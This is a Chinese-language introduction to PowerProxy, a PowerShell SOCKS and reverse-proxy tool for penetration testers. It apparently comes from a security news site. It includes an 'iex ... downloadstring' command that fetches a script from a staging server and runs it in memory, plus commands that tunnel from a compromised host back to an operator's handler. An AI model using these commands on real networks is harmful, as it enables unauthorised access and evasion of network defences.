![](https://image.3001.net/images/20220531/1654003608_6296179816e61990492d9.png!small)

## 关于PowerProxy

PowerProxy是一款功能强大的PowerShell
Socks代理工具，该工具带有反向代理功能，可以帮助广大安全研究人员更加轻松地完成某些特定场景下的渗透测试任务。

PowerProxy专为渗透测试人员设计，在遍历阻止入站连接的网络时，反向代理功能肯定是要优先考虑的。在默认情况下，反向代理连接会经过加密处理，而Socks5连接也支持基于用户名和密码的身份验证。

## 工具下载

广大研究人员可以使用下列命令将该项目源码克隆至本地：

    
    
    git clone https://github.com/get-get-get-get/PowerProxy.git

## 工具配置

我们可以使用下列命令导入PowerProxy脚本：

    
    
    iex (new-object net.webclient).downloadstring("http://192.168.0.22/PowerProxy.ps1")

或者：

    
    
    Import-Module \\192.168.0.22\Public\PowerProxy.ps1

其中，reverse_proxy_handler.py能够创建临时SSL证书，此功能需要使用到OpenSSL。如果你的设备上没有安装OpenSSL的话，这需要使用你自己的证书，或者使用“--no-encrypt”选项，不过大多数Linux或类Unix系统默认都会安装有OpenSSL。

## 工具使用

### 查看工具帮助信息

    
    
    ./reverse_proxy_handler.py --help

### 运行一个反向代理

在本地设备上，使用下列命令开启一个Handler，此时Handler将会监听端口8080上的反向代理，客户端默认将连接至端口1080:

    
    
    ./reverse_proxy_handler.py -p 8080

接下来，在PowerShell窗口中，运行下列命令：

    
    
    Start-ReverseSocksProxy 172.1.1.20 -Port 8080

代理客户端此时会将reverse_proxy_handler.py脚本创建的服务器当作实际的Socks服务器对待：

    
    
    curl --socks4 127.0.0.1:1080 http://10.10.2.69/

### 运行一台传统意义上的Socks服务器

    
    
    Start-SocksProxy 172.10.2.20 -Port 9050

### 开启身份验证

我们可以使用PSCredential对象来要求用户在连接时提供正确的用户名和密码：

    
    
    # 创建凭证
    
    $Password = ConvertTo-SecureString -AsPlaintext -Force "Passw0rd123"
    
    $Cred = New-Object System.Management.Automation.PSCredential ("ProxyUser", $Password)
    
     
    
    Start-ReverseSocksProxy -Credential $Cred -Address 10.10.10.24 -Verbose

## 工具限制

> 1、仅支持CONNECT请求；
>
> 2、不支持GSSAPI认证；
>
> 3、reverse_proxy_handler.py仅在类Unix系统上进行过测试，不确定是否支持Windows系统；

## 许可证协议

本项目的开发与发布遵循[ _GPL_ _-3.0_](https://github.com/get-get-get-get/PowerProxy/blob/master/LICENSE)开源许可证协议。

## 项目地址

 **PowerProxy：** 【[ _GitHub传送门_](https://github.com/get-get-get-get/PowerProxy)】

